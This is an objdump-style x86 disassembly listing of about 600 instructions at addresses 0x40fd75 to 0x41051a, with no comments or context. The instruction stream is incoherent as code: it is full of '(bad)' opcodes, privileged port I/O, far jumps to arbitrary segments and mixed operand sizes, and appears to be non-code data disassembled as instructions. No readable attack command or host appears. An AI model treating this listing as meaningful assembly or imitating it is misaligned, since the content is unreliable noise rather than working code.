  40fd75:	repnz outs dx,BYTE PTR es:[esi]
  40fd78:	xchg   esi,eax
  40fd79:	mov    ss,ebp
  40fd7b:	adc    DWORD PTR [edi],ebx
  40fd7d:	push   ecx
  40fd7e:	inc    ebx
  40fd7f:	repz test ecx,ebx
  40fd82:	mov    DWORD PTR [edi+0x55],ebx
  40fd85:	push   es
  40fd86:	rol    BYTE PTR [esi],1
  40fd88:	inc    ebp
  40fd89:	dec    esi
  40fd8a:	pop    edi
  40fd8b:	and    DWORD PTR [ecx],0xffffffea
  40fd8e:	and    BYTE PTR [edi+0x3],dh
  40fd91:	sti    
  40fd92:	aam    0x4e
  40fd94:	pop    edi
  40fd95:	in     eax,dx
  40fd96:	popf   
  40fd97:	adc    BYTE PTR ds:0x820f0e0e,0x65
  40fd9e:	gs icebp 
  40fda0:	fs jo  0x40fd7c
  40fda3:	pushfw 
  40fda5:	xchg   ebp,eax
  40fda6:	aas    
  40fda7:	add    DWORD PTR [ecx+0x5508c8cf],edi
  40fdad:	xor    ch,cl
  40fdaf:	lods   al,BYTE PTR ds:[esi]
  40fdb0:	add    eax,0x366f8dcb
  40fdb5:	cwde   
  40fdb6:	add    BYTE PTR [ebx+0x33d769c1],0xc0
  40fdbd:	arpl   WORD PTR [ecx],bx
  40fdbf:	loope  0x40fe1f
  40fdc1:	xor    ebp,DWORD PTR [ecx]
  40fdc3:	or     eax,DWORD PTR [ebp+esi*1+0x353e0b72]
  40fdca:	rcl    BYTE PTR [ebx-0x45afba7d],cl
  40fdd0:	(bad)  
  40fdd1:	pusha  
  40fdd2:	mov    cl,0x1a
  40fdd4:	mov    edi,DWORD PTR [eax-0x4d4e99ec]
  40fdda:	sub    eax,0xf7d9ed0c
  40fddf:	test   DWORD PTR [esi],0xb93afc61
  40fde5:	mov    ecx,0xd7920f09
  40fdea:	scas   al,BYTE PTR es:[edi]
  40fdeb:	es mov ecx,0xe4b8ce2b
  40fdf1:	gs or  eax,0xa0b7dc20
  40fdf7:	lods   eax,DWORD PTR ds:[esi]
  40fdf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdf9:	fimul  DWORD PTR [ecx+0x675ec264]
  40fdff:	int3   
  40fe00:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40fe02:	cmp    DWORD PTR [esi],0x6d575f26
  40fe08:	lea    ecx,[ebx]
  40fe0a:	dec    ebp
  40fe0b:	outs   dx,DWORD PTR ds:[esi]
  40fe0c:	jmp    0x5b12:0x240b77da
  40fe13:	in     eax,0xf2
  40fe15:	or     eax,0x237156f2
  40fe1a:	into   
  40fe1b:	into   
  40fe1c:	(bad)  
  40fe1d:	(bad)  
  40fe1f:	pop    ebp
  40fe20:	mov    esp,0x2d186dc8
  40fe25:	sub    BYTE PTR [edi-0x42],cl
  40fe28:	add    esp,DWORD PTR [esi+0x65d77a18]
  40fe2e:	lea    ebx,[esi]
  40fe30:	jecxz  0x40fe25
  40fe32:	push   esi
  40fe33:	arpl   WORD PTR [esi],si
  40fe35:	dec    edi
  40fe36:	cs jns 0x40fe7c
  40fe39:	xor    DWORD PTR [ecx+0x7645444e],eax
  40fe3f:	add    eax,0x35398ced
  40fe44:	das    
  40fe45:	ror    BYTE PTR [ebx+0x13310a34],0x47
  40fe4c:	xchg   BYTE PTR [edi+0x3d],dh
  40fe4f:	cmp    al,0x4f
  40fe51:	xchg   ebp,eax
  40fe52:	cmp    edi,DWORD PTR [edx+0x4aba470b]
  40fe58:	jnp    0x40fec8
  40fe5a:	jecxz  0x40fea9
  40fe5c:	enter  0x9c8a,0x8f
  40fe60:	(bad)  
  40fe61:	mov    esi,0x5f4347db
  40fe66:	or     DWORD PTR [ebx+0x71],edi
  40fe69:	in     al,0xa0
  40fe6b:	xor    dl,BYTE PTR [esi]
  40fe6d:	pushf  
  40fe6e:	dec    esp
  40fe6f:	test   BYTE PTR [edx+edx*1-0x2e7d2899],0x24
  40fe77:	xor    al,0x14
  40fe79:	enter  0x4e1c,0xb1
  40fe7d:	xor    ebx,ebp
  40fe7f:	cmp    eax,esp
  40fe81:	pop    ebp
  40fe82:	pop    esp
  40fe83:	mov    esi,0x81f2705e
  40fe88:	or     BYTE PTR [eax],cl
  40fe8a:	in     eax,0x8f
  40fe8c:	push   ebp
  40fe8d:	jmp    DWORD PTR [eax]
  40fe8f:	and    eax,0x8cedc99b
  40fe95:	mov    ecx,0xe2d3af7b
  40fe9a:	sub    eax,0xd8ea7bc8
  40fe9f:	test   dl,dh
  40fea1:	std    
  40fea2:	test   eax,0x9f1f6556
  40fea7:	ja     0x40fe72
  40fea9:	mov    gs,WORD PTR [eax]
  40feab:	shl    BYTE PTR [edi+0x4b],1
  40feae:	cmp    DWORD PTR [ecx+edx*1-0x19e89715],ebx
  40feb5:	xor    eax,0x590d8a3
  40feba:	loopne 0x40fe89
  40febc:	add    edi,DWORD PTR [ebp-0x2f93c59]
  40fec2:	mov    DWORD PTR [ebx-0x608c4507],eax
  40fec8:	jns    0x40ff18
  40feca:	dec    edx
  40fecb:	pop    edi
  40fecc:	aaa    
  40fecd:	pop    ss
  40fece:	leave  
  40fecf:	jmp    0xb3c3:0xa43c7b45
  40fed6:	pop    ss
  40fed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fed8:	jmp    0xa941d041
  40fedd:	(bad)  
  40fede:	or     esp,ebx
  40fee0:	sub    edi,esi
  40fee2:	mul    ebp
  40fee4:	popa   
  40fee5:	xor    BYTE PTR [esi+0x2e],bh
  40fee8:	jnp    0x40feb3
  40feea:	aas    
  40feeb:	adc    BYTE PTR [edx-0x13af1075],0xaf
  40fef2:	cmp    DWORD PTR [ebx+0x7beeb15a],esi
  40fef8:	out    0x44,eax
  40fefa:	ret    0x174c
  40fefd:	dec    esi
  40fefe:	into   
  40feff:	sbb    ebx,esi
  40ff01:	adc    eax,0x6c258601
  40ff06:	js     0x40ff13
  40ff08:	mov    ds:0x6366fffd,eax
  40ff0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff0e:	mov    edx,0x43d9a25e
  40ff13:	or     al,0x7a
  40ff15:	and    esp,DWORD PTR [esi]
  40ff17:	enter  0x5402,0xdf
  40ff1b:	jmp    0x4835f3a7
  40ff20:	push   ecx
  40ff21:	imul   BYTE PTR [ebx+0x65]
  40ff24:	stos   DWORD PTR es:[edi],eax
  40ff25:	shr    BYTE PTR [eax-0x12],0xe2
  40ff29:	(bad)  
  40ff2a:	sub    esi,eax
  40ff2c:	sbb    esi,0xd
  40ff2f:	xor    al,0xaf
  40ff31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff32:	arpl   si,si
  40ff34:	mov    bl,BYTE PTR [ebp+0x56]
  40ff37:	int3   
  40ff38:	jbe    0x40fec7
  40ff3a:	sar    ah,1
  40ff3c:	xchg   BYTE PTR [ecx],bh
  40ff3e:	sub    al,0x73
  40ff40:	dec    edi
  40ff41:	jb     0x40fefd
  40ff43:	adc    DWORD PTR [eax+0x710ee8c1],esi
  40ff49:	cmp    ch,0xe9
  40ff4c:	pop    ebp
  40ff4d:	cwde   
  40ff4e:	cwde   
  40ff4f:	ja     0x40ff04
  40ff51:	les    edi,FWORD PTR [eax+0x3c23a035]
  40ff57:	jg     0x40ff8d
  40ff59:	aam    0xf5
  40ff5b:	(bad)  
  40ff5c:	out    0xb0,al
  40ff5e:	shl    esp,1
  40ff60:	push   esi
  40ff61:	retf   0xf9a7
  40ff64:	mov    DWORD PTR [ebx],esp
  40ff66:	ja     0x40ffcb
  40ff68:	jne    0x40ffc9
  40ff6a:	lods   al,BYTE PTR ds:[esi]
  40ff6b:	jns    0x40feee
  40ff6d:	push   edi
  40ff6e:	xchg   ebx,eax
  40ff6f:	mov    edx,DWORD PTR [edi]
  40ff71:	jg     0x40ff90
  40ff73:	or     DWORD PTR [ecx+ebx*8-0x3d],ebp
  40ff77:	push   esi
  40ff78:	jmp    0x40ff7a
  40ff7a:	mov    cl,0xe5
  40ff7c:	clc    
  40ff7d:	inc    ebp
  40ff7e:	fcmovnu st,st(6)
  40ff80:	mov    ecx,0x45c71a98
  40ff85:	and    ch,dl
  40ff87:	scas   al,BYTE PTR es:[edi]
  40ff88:	int3   
  40ff89:	push   esp
  40ff8a:	rcl    DWORD PTR [ecx-0x117fcd19],1
  40ff90:	push   ebp
  40ff91:	jmp    0xa8a6d645
  40ff96:	test   DWORD PTR [ecx-0x5a],ebp
  40ff99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff9a:	jno    0x40ff32
  40ff9c:	dec    esp
  40ff9d:	add    bh,0x8d
  40ffa0:	pushf  
  40ffa1:	mov    ds,WORD PTR [edi]
  40ffa3:	sub    al,BYTE PTR [ebx-0x5f]
  40ffa6:	aam    0x14
  40ffa8:	dec    esi
  40ffa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffab:	sub    ah,BYTE PTR [edx-0x7ec85110]
  40ffb1:	je     0x40ffda
  40ffb3:	je     0x40ffe5
  40ffb5:	mov    edi,0x3726affa
  40ffba:	ss mov edi,0x6b825eb
  40ffc0:	mov    DWORD PTR [ebx+eax*4+0x73],eax
  40ffc4:	repnz rep lods eax,DWORD PTR ds:[esi]
  40ffc7:	stos   BYTE PTR es:[edi],al
  40ffc8:	hlt    
  40ffc9:	add    al,0x11
  40ffcb:	dec    esi
  40ffcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffcd:	repnz cmp bh,BYTE PTR [ebp-0x1a]
  40ffd1:	mov    gs,WORD PTR [ebp-0x62]
  40ffd4:	(bad)  
  40ffd5:	fidiv  DWORD PTR [bp+di]
  40ffd8:	dec    ecx
  40ffd9:	dec    eax
  40ffda:	aas    
  40ffdb:	out    0x89,eax
  40ffdd:	xchg   edx,eax
  40ffde:	push   ss
  40ffdf:	not    BYTE PTR [ebp-0x6c74f9d7]
  40ffe5:	and    BYTE PTR [edx-0x6e],ah
  40ffe8:	(bad)  
  40ffe9:	in     al,dx
  40ffea:	jo     0x7f341052
  40fff0:	cld    
  40fff1:	mov    ds:0xf1a3d4ab,al
  40fff6:	sub    eax,0x2646bd8f
  40fffb:	fimul  DWORD PTR [edi+ebp*8+0x6494ea31]
  410002:	sub    al,0xf5
  410004:	(bad)  
  410005:	fisttp DWORD PTR [edi+0x1c]
  410008:	cli    
  410009:	mov    ch,0xf5
  41000b:	int3   
  41000c:	xchg   ebx,eax
  41000d:	adc    eax,0x5900966e
  410012:	pop    ecx
  410013:	xchg   ax,ax
  410015:	adc    esp,0x72b52efa
  41001b:	push   ebx
  41001c:	shl    DWORD PTR [edi],cl
  41001e:	aas    
  41001f:	imul   esi,DWORD PTR [edx+0x4e],0x904a5dbc
  410026:	dec    ecx
  410027:	fdivrp st(2),st
  410029:	inc    ebp
  41002a:	(bad)  [esi+0x445ffbdd]
  410030:	adc    eax,0xfe1a505b
  410035:	mov    ch,0x52
  410037:	adc    dl,BYTE PTR [esi]
  410039:	cs aad 0x38
  41003c:	mov    edi,esp
  41003e:	cmp    cl,BYTE PTR [esi+edi*1]
  410041:	cmp    DWORD PTR [edi+0x38e3ec3b],ebx
  410047:	test   bl,0x38
  41004a:	xchg   esp,eax
  41004b:	mov    edx,gs
  41004d:	cwde   
  41004e:	pop    edx
  41004f:	ins    BYTE PTR es:[edi],dx
  410050:	sbb    eax,0x3c08a624
  410055:	jb     0x410011
  410057:	and    al,0x10
  410059:	push   ebp
  41005a:	push   edi
  41005b:	bound  edi,QWORD PTR [ebp+0x69cee95d]
  410061:	mov    dl,0xf4
  410063:	ja     0x40fffa
  410065:	mov    ebp,0x7c93e142
  41006a:	add    al,BYTE PTR [ebx]
  41006c:	imul   ecx,DWORD PTR [esi-0x66],0x9341d0a5
  410073:	daa    
  410074:	fs in  eax,dx
  410076:	scas   eax,DWORD PTR es:[edi]
  410077:	fldcw  WORD PTR [edx-0x1d]
  41007a:	mov    eax,0xa7670e45
  41007f:	cs lock pusha 
  410082:	xor    eax,0xa1489edd
  410087:	mov    eax,ds:0x2b581d2c
  41008c:	out    0xa4,eax
  41008e:	ins    BYTE PTR es:[edi],dx
  41008f:	mov    ch,BYTE PTR [ebx]
  410091:	(bad)  
  410092:	lock out dx,eax
  410094:	cmp    DWORD PTR [eax],edi
  410096:	(bad)  
  410097:	(bad)  
  410099:	jo     0x4100dc
  41009b:	mov    bh,0x82
  41009d:	mov    esi,0xe4a5117f
  4100a2:	mov    gs,WORD PTR [ecx+esi*1]
  4100a5:	fcmovne st,st(4)
  4100a7:	pop    esp
  4100a8:	retf   0xcc1c
  4100ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100ac:	cmp    al,0x58
  4100ae:	jl     0x4100c5
  4100b0:	ror    BYTE PTR [esi+edx*8],cl
  4100b3:	mov    cs,WORD PTR [ebp+esi*1-0x1]
  4100b7:	xchg   ebp,eax
  4100b8:	retf   
  4100b9:	xchg   DWORD PTR [ebx],eax
  4100bb:	or     esi,ebx
  4100bd:	xchg   esi,eax
  4100be:	jo     0x410110
  4100c0:	sub    al,0xf3
  4100c2:	sbb    eax,DWORD PTR [ebx+ebx*4+0x76]
  4100c6:	dec    DWORD PTR [eax-0x80]
  4100c9:	and    DWORD PTR ds:0xc4f6,0x4573ded
  4100d2:	pop    ebx
  4100d3:	cli    
  4100d4:	pminub mm0,QWORD PTR [edx+0x2812ed51]
  4100db:	jbe    0x41013c
  4100dd:	dec    esp
  4100de:	sbb    DWORD PTR [edi+eiz*1+0x34f19480],ebx
  4100e5:	in     eax,0x19
  4100e7:	mov    bh,0xf1
  4100e9:	mov    ebp,DWORD PTR [esi+0x5cb83843]
  4100ef:	dec    eax
  4100f0:	lds    edi,FWORD PTR [ebx+0xf]
  4100f3:	js     0x410158
  4100f5:	out    dx,al
  4100f6:	xor    al,bh
  4100f8:	call   0x9060:0x484fe6c7
  4100ff:	sbb    DWORD PTR [ebx+0x4],ebp
  410102:	xchg   ebx,eax
  410103:	or     al,BYTE PTR [esi-0x295c6240]
  410109:	iret   
  41010a:	cmp    al,0x31
  41010c:	xchg   esp,eax
  41010d:	inc    esp
  41010e:	push   0xcb4fdc42
  410113:	and    al,BYTE PTR [edi+0x13]
  410116:	or     al,0x65
  410118:	jmp    0x7c0:0x18ffe4a5
  41011f:	mov    dh,0x86
  410121:	jp     0x410192
  410123:	pop    esi
  410124:	pusha  
  410125:	in     eax,0x75
  410127:	jmp    0x41011e
  410129:	je     0x41018f
  41012b:	inc    ebp
  41012c:	mov    esi,0x492dc6f6
  410131:	fild   DWORD PTR ds:0x156c6a5c
  410137:	push   esi
  410138:	data16 cmp ah,BYTE PTR [esi]
  41013b:	inc    ebp
  41013c:	mov    esi,0xfda164d0
  410141:	shl    DWORD PTR [eax+0x1b],cl
  410144:	jmp    0x86f9:0xf8ecd31a
  41014b:	lea    eax,[esi+0x4f]
  41014e:	fild   DWORD PTR [edi]
  410150:	push   edi
  410151:	jmp    0x88ec5bf1
  410156:	and    BYTE PTR [eax+0x62],al
  410159:	sub    eax,0xb16b6bbd
  41015e:	fidiv  WORD PTR [eax+edi*1-0x34]
  410162:	pusha  
  410163:	xor    bl,BYTE PTR [esi-0x45886026]
  410169:	sbb    ah,0x64
  41016c:	ins    DWORD PTR es:[edi],dx
  41016d:	push   eax
  41016e:	add    bl,dh
  410170:	sub    DWORD PTR gs:0x16b89e69,ecx
  410177:	sti    
  410178:	ficom  WORD PTR [ebx]
  41017a:	push   eax
  41017b:	pop    ss
  41017c:	lods   al,BYTE PTR ds:[esi]
  41017d:	and    ebp,DWORD PTR [edi-0x32]
  410180:	inc    ebp
  410181:	dec    esi
  410182:	and    bl,BYTE PTR [edx-0x29]
  410185:	loop   0x41014b
  410187:	cmp    BYTE PTR [eax+0x75],dh
  41018a:	leave  
  41018b:	iret   
  41018c:	push   edx
  41018d:	popf   
  41018e:	sahf   
  41018f:	mov    al,0x90
  410191:	cmp    ecx,eax
  410193:	retf   
  410194:	mov    ch,0xd1
  410196:	and    al,0xfa
  410198:	mov    dh,bh
  41019a:	mov    esp,0xe8a1238c
  41019f:	fwait
  4101a0:	int    0x6c
  4101a2:	lea    esp,[edx-0x4d]
  4101a5:	cwde   
  4101a6:	sub    eax,0x3b0e9d2e
  4101ab:	iret   
  4101ac:	mov    eax,0xe6fc4368
  4101b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101b2:	int    0x6c
  4101b4:	xlat   BYTE PTR ds:[ebx]
  4101b5:	das    
  4101b6:	mov    ds,WORD PTR [edx+0x36]
  4101b9:	or     esp,esi
  4101bb:	inc    ebp
  4101bc:	sub    bl,dh
  4101be:	mov    bl,0xf6
  4101c0:	imul   eax,DWORD PTR [eax+eax*4],0xdc985a52
  4101c7:	ds add al,0x9a
  4101ca:	cmc    
  4101cb:	mov    eax,0xf4e5233c
  4101d0:	fidiv  WORD PTR [eax-0x4da84cf5]
  4101d6:	into   
  4101d7:	imul   DWORD PTR [eax+0x517e9abe]
  4101dd:	adc    eax,0x1e61060f
  4101e2:	rcr    BYTE PTR [edx],0x1f
  4101e5:	mov    edi,0xb20dcb0b
  4101ea:	loop   0x4101f7
  4101ec:	fwait
  4101ed:	jp     0x410179
  4101ef:	cli    
  4101f0:	cld    
  4101f1:	in     eax,dx
  4101f2:	ss (bad) 
  4101f4:	push   esi
  4101f5:	bswap  ebp
  4101f7:	test   DWORD PTR [eax-0x71b63938],ecx
  4101fd:	jmp    0x410189
  4101ff:	adc    DWORD PTR [esi+ecx*2-0x483d3cae],ebp
  410206:	adc    BYTE PTR [eax],0xba
  410209:	cmp    ebx,edx
  41020b:	cmp    edi,eax
  41020d:	sbb    eax,0x326de8ae
  410212:	mov    ebp,0xa4f1200f
  410217:	repnz (bad) 
  410219:	cdq    
  41021a:	mov    bh,0x73
  41021c:	inc    BYTE PTR [edx-0x39]
  41021f:	pop    edi
  410220:	int    0xda
  410222:	out    0x65,eax
  410224:	inc    ecx
  410225:	loopne 0x41023f
  410227:	mov    BYTE PTR [ecx],bl
  410229:	xchg   ebp,eax
  41022a:	xchg   edx,eax
  41022b:	out    0x55,eax
  41022d:	pop    ecx
  41022e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41022f:	xchg   esp,eax
  410230:	mov    ch,0xf9
  410232:	push   edi
  410233:	jb     0x41029e
  410235:	inc    esp
  410236:	neg    BYTE PTR [ecx+0x50]
  410239:	clc    
  41023a:	add    ch,ah
  41023c:	lds    ebp,FWORD PTR [esi]
  41023e:	cmp    eax,0xd182715f
  410243:	retf   
  410244:	xchg   ecx,eax
  410245:	mov    esi,0x21cecc6c
  41024a:	mov    ch,0x90
  41024c:	jmp    0x1123012
  410251:	push   esi
  410252:	leave  
  410253:	(bad)  
  410254:	in     eax,dx
  410255:	adc    esi,ecx
  410257:	push   esp
  410258:	shl    eax,0xd
  41025b:	jne    0x4102c7
  41025d:	push   edx
  41025e:	pushf  
  41025f:	shr    DWORD PTR [esi],cl
  410261:	inc    ecx
  410262:	shl    BYTE PTR [ebx],cl
  410264:	xor    al,0xcf
  410266:	(bad)  
  410267:	int3   
  410268:	mov    eax,ds:0xbd8e0ae3
  41026d:	mov    ecx,0xf7fe6f61
  410272:	jmp    0x5d06:0x69389334
  410279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41027a:	mov    ds:0xba3b5d70,eax
  410280:	mov    dl,BYTE PTR [ebx+0x152af5d3]
  410286:	mov    edi,0x5372e452
  41028b:	call   0x504a:0xdda5d4e1
  410292:	jae    0x410261
  410294:	adc    edi,esi
  410296:	add    dl,BYTE PTR [ebx-0x52]
  410299:	dec    esp
  41029a:	pop    ebx
  41029b:	xor    eax,0xba91e1fd
  4102a0:	enter  0x5ad,0x29
  4102a4:	scas   eax,DWORD PTR es:[edi]
  4102a5:	push   esp
  4102a6:	mov    cl,0x9f
  4102a8:	push   ds
  4102a9:	fwait
  4102aa:	jb     0x4102c6
  4102ac:	sub    bh,bl
  4102ae:	sub    BYTE PTR [ecx-0x765518f4],ah
  4102b4:	xchg   ebp,eax
  4102b5:	ss push ss
  4102b7:	add    DWORD PTR [edx],edx
  4102b9:	fdivr  QWORD PTR [si]
  4102bc:	mov    esi,0x241b3f6d
  4102c1:	push   edx
  4102c2:	xchg   ebp,eax
  4102c3:	aas    
  4102c4:	aaa    
  4102c5:	daa    
  4102c6:	in     eax,dx
  4102c7:	mov    esi,0xc2ffe49f
  4102cc:	aad    0x4
  4102ce:	add    ah,ah
  4102d0:	mov    eax,ds:0xcb0f2f14
  4102d5:	scas   eax,DWORD PTR es:[edi]
  4102d6:	arpl   WORD PTR [esi+0x4c],dx
  4102d9:	fdivrp st(5),st
  4102db:	loop   0x410349
  4102dd:	push   ebp
  4102de:	fcom   QWORD PTR [ebp+0x62]
  4102e1:	das    
  4102e2:	or     DWORD PTR [ebx],ebp
  4102e4:	pop    esi
  4102e5:	std    
  4102e6:	jmp    0xc0d8:0xf44a2205
  4102ed:	push   es
  4102ee:	sub    edi,DWORD PTR [eax]
  4102f0:	dec    eax
  4102f1:	push   ecx
  4102f2:	fimul  DWORD PTR [edx+0x6a]
  4102f5:	nop
  4102f6:	cwde   
  4102f7:	inc    esi
  4102f8:	addr16 arpl sp,cx
  4102fb:	loop   0x410349
  4102fd:	retf   
  4102fe:	mov    ch,0x1e
  410300:	jecxz  0x410360
  410302:	xor    DWORD PTR [ebx+0x4f],esi
  410305:	jp     0x41034f
  410307:	xchg   ebx,eax
  410308:	test   BYTE PTR [ecx-0x66],ah
  41030b:	adc    eax,0xccef7fb
  410310:	mul    BYTE PTR [eax-0x78]
  410313:	ins    BYTE PTR es:[edi],dx
  410314:	dec    edx
  410315:	loopne 0x410387
  410317:	cmp    ecx,ebx
  410319:	cmc    
  41031a:	cmp    DWORD PTR [edi],ebx
  41031c:	or     DWORD PTR [ebp-0x23ce04cf],0x2b
  410323:	outs   dx,DWORD PTR ds:[esi]
  410324:	rol    DWORD PTR [edx],cl
  410326:	fmul   DWORD PTR [ecx+0x349707]
  41032c:	repz add bh,ch
  41032f:	mov    DWORD PTR [ebx+0x7c14a7eb],esi
  410335:	rcl    BYTE PTR [ebp+ebp*4-0x1b],0xc2
  41033a:	pop    edx
  41033b:	sub    DWORD PTR [ecx-0x70],esi
  41033e:	jo     0x41037b
  410340:	add    ch,BYTE PTR [edi-0x15]
  410343:	mov    ebp,0x87be86de
  410348:	mov    ah,0xba
  41034a:	clc    
  41034b:	mov    ebp,0x975712bd
  410350:	sbb    edi,DWORD PTR [ecx-0x28]
  410353:	bound  ecx,QWORD PTR ds:[esi]
  410356:	sbb    al,al
  410358:	push   0xffffffd4
  41035a:	ja     0x4103d3
  41035c:	or     al,0x95
  41035e:	push   cs
  41035f:	pop    eax
  410360:	cmp    bh,BYTE PTR [ecx+0x36]
  410363:	les    ebx,FWORD PTR [ecx+0x6c]
  410366:	lea    edx,ss:[edi+0x4b]
  41036a:	call   0x4822:0xa33b32a4
  410371:	sbb    ecx,esi
  410373:	inc    esi
  410374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410375:	pop    ebx
  410376:	pop    eax
  410377:	addr16 push ebx
  410379:	rcl    DWORD PTR [edi+0x53],0x8e
  41037d:	jmp    0x41034a
  41037f:	enter  0x5a3f,0x4c
  410383:	lods   eax,DWORD PTR ds:[esi]
  410384:	dec    ebx
  410385:	nop    DWORD PTR [edx]
  410388:	jl     0x410352
  41038a:	mov    ebx,0x256e74e7
  41038f:	ret    
  410390:	xchg   esp,eax
  410391:	and    cl,cl
  410393:	in     al,0x1e
  410395:	cmc    
  410396:	popa   
  410397:	nop
  410398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410399:	lea    edi,[ebx-0x431749a5]
  41039f:	inc    edx
  4103a0:	mov    gs,WORD PTR [edx+0x598c13ca]
  4103a6:	cmp    dh,cl
  4103a8:	ja     0x410391
  4103aa:	push   ss
  4103ab:	sbb    dl,cl
  4103ad:	call   0x7d0b:0xe1e4e14
  4103b4:	push   DWORD PTR [ecx]
  4103b6:	adc    al,bl
  4103b8:	dec    esi
  4103b9:	xlat   BYTE PTR ds:[ebx]
  4103ba:	add    DWORD PTR [edx+eax*4+0x4fdcbb0a],0x6699e506
  4103c5:	or     eax,0xbe58e9ac
  4103ca:	jae    0x41041e
  4103cc:	rol    DWORD PTR [esp+edi*2+0x299b1d35],1
  4103d3:	out    0x45,eax
  4103d5:	outs   dx,DWORD PTR ds:[esi]
  4103d6:	xchg   ebx,eax
  4103d7:	daa    
  4103d8:	scas   eax,DWORD PTR es:[edi]
  4103d9:	cmp    al,0x3a
  4103db:	lods   eax,DWORD PTR ds:[esi]
  4103dc:	scas   eax,DWORD PTR es:[edi]
  4103dd:	outs   dx,DWORD PTR ds:[esi]
  4103de:	and    ch,BYTE PTR [eax+0x7954a396]
  4103e4:	push   es
  4103e5:	inc    ecx
  4103e6:	pop    ds
  4103e7:	fbld   TBYTE PTR ds:[ebx+edx*4]
  4103eb:	adc    edi,DWORD PTR [ecx+0x49]
  4103ee:	ret    
  4103ef:	mov    bl,0xa0
  4103f1:	mov    ch,0xe5
  4103f3:	pushf  
  4103f4:	and    eax,DWORD PTR [ecx-0x23]
  4103f7:	call   0x14b98b10
  4103fc:	or     eax,0xf80561c1
  410401:	out    0x8a,eax
  410403:	fnstcw WORD PTR [ebx-0x1ac48141]
  410409:	sub    edx,esp
  41040b:	mov    bh,0xc7
  41040d:	adc    BYTE PTR [edi+0x537ae1ae],dh
  410413:	repz stc 
  410415:	sub    DWORD PTR [eax+0x52],0x78
  410419:	iret   
  41041a:	and    edi,ebp
  41041c:	mov    eax,0xe1895069
  410421:	fldcw  WORD PTR [esi-0x7d5e87]
  410427:	jp     0x41040a
  410429:	pop    esp
  41042a:	mov    bl,0x8d
  41042c:	cdq    
  41042d:	mov    ah,0xdd
  41042f:	xlat   BYTE PTR ds:[ebx]
  410430:	fwait
  410431:	(bad)  
  410432:	fsubr  DWORD PTR [ecx]
  410434:	enter  0x3fee,0x70
  410438:	ficom  DWORD PTR [ecx-0x50faf49b]
  41043e:	pop    ebp
  41043f:	shr    DWORD PTR [ebp+0x58b92d8c],0x81
  410446:	mov    al,0x6f
  410448:	xchg   edx,eax
  410449:	cdq    
  41044a:	lahf   
  41044b:	into   
  41044c:	rol    bh,1
  41044e:	inc    eax
  41044f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410450:	sub    eax,DWORD PTR [eax+0x2a3f9f86]
  410456:	inc    edi
  410457:	xlat   BYTE PTR ds:[ebx]
  410458:	shl    DWORD PTR [ecx],cl
  41045a:	rcl    DWORD PTR [ebx],cl
  41045c:	out    0x4b,al
  41045e:	and    BYTE PTR [esi+0x5c0044b9],dl
  410464:	add    al,0x74
  410466:	fcom   QWORD PTR [ecx+0x8]
  410469:	cmp    dl,BYTE PTR [esi+0x18]
  41046c:	and    DWORD PTR [ebp+0x11],esp
  41046f:	jno    0x410433
  410471:	in     eax,dx
  410472:	adc    al,0xa7
  410474:	fs retf 
  410476:	dec    ebp
  410477:	mov    bh,0x58
  410479:	or     ecx,edi
  41047b:	das    
  41047c:	imul   edx,DWORD PTR [edi-0x64],0x8e1ea956
  410483:	dec    edx
  410484:	xor    DWORD PTR [edx+0x79],0x8d14340a
  41048b:	push   es
  41048c:	sbb    eax,0x14bd7548
  410491:	push   es
  410492:	adc    edi,ebx
  410494:	inc    esi
  410495:	stos   BYTE PTR es:[edi],al
  410496:	mov    dl,0x15
  410498:	lock or DWORD PTR gs:[ebp+0x36],esi
  41049d:	jg     0x410445
  41049f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a0:	inc    eax
  4104a1:	enter  0xc2ed,0xff
  4104a5:	pop    ebx
  4104a6:	inc    esp
  4104a7:	fucomi st,st(6)
  4104a9:	loopne 0x41050f
  4104ab:	repnz cmp BYTE PTR [edx],cl
  4104ae:	xchg   edx,eax
  4104af:	les    esi,FWORD PTR [ebx-0x37]
  4104b2:	or     esi,DWORD PTR [ebx+eax*1]
  4104b5:	push   ebp
  4104b6:	nop
  4104b7:	pop    edi
  4104b8:	ja     0x4104d4
  4104ba:	mov    ebp,0x5c71ee9
  4104bf:	push   edi
  4104c0:	push   esi
  4104c1:	inc    esi
  4104c2:	lahf   
  4104c3:	cwde   
  4104c4:	call   0xa7df:0x6a1596f7
  4104cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104cc:	fstp   QWORD PTR [edi+eiz*4+0x13]
  4104d0:	imul   esi,DWORD PTR [ebx+0x5da4ad66],0xe03f9d2c
  4104da:	and    DWORD PTR [ebx+0x45],0xfb5dd5d
  4104e1:	mov    dh,BYTE PTR cs:[edi+ebp*1-0x40]
  4104e6:	sbb    al,0x20
  4104e8:	cmp    al,0xbc
  4104ea:	fucomi st,st(4)
  4104ec:	imul   edi,DWORD PTR [edx+esi*1],0xfffffff0
  4104f0:	seto   BYTE PTR [eax-0x5ce8c719]
  4104f7:	adc    al,0xc1
  4104f9:	nop
  4104fa:	push   ds
  4104fb:	pusha  
  4104fc:	adc    dh,BYTE PTR [edi-0x56ee8d40]
  410502:	push   ss
  410503:	ins    DWORD PTR es:[edi],dx
  410504:	mov    edx,0x34a73c7a
  410509:	mov    dh,dl
  41050b:	test   BYTE PTR [esi],cl
  41050d:	daa    
  41050e:	dec    edi
  41050f:	adc    DWORD PTR [ecx],0xffffffc1
  410512:	ds mov esp,0x1c3d069c
  410518:	sub    al,0x75
  41051a:	jnp    0x410595
